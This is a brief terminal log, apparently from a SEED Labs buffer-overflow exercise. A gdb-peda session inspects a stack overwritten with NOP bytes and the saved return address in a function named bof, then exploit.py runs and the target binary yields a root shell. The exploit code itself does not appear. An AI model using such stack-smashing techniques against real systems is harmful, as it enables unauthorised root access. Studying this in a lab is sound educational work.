0028| 0xffffca7c --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x56556284 in bof (
    str=0x90909090 <error: Cannot access memory at address 0x90909090>)
    at A1.c:29
29	}
gdb-peda$ p (*(unsigned*)($ebp+4))
$4 = 0xffffd259
gdb-peda$ q
[06/17/22]seed@VM:~/.../b2_16$ python3 exploit.py 
[06/17/22]seed@VM:~/.../b2_16$ ./A1
Inside Main
Inside Foo
# whoasm  amo                                                                  
zsh: command not found: whoaamo
# whoami                                                                       
root
#  
